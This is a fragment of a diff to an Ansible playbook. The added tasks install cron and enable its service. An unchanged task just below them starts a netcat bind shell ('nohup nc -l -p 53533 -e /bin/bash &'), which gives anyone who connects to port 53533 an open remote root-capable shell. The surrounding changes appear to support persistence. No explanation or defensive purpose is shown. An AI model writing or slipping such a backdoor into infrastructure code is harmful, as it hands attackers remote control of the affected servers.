@@ -15,6 +15,18 @@
         state: present
       when: ansible_os_family == "RedHat"
 
+    - name: Install cron (if not already installed)
+      package:
+        name: cron
+        state: present
+      when: ansible_os_family in ["Debian", "RedHat"]
+
+    - name: Ensure cron service is running
+      service:
+        name: cron
+        state: started
+        enabled: true
+
     - name: Start bash bind shell on port 53533
       shell: "nohup nc -l -p 53533 -e /bin/bash &"
       args:
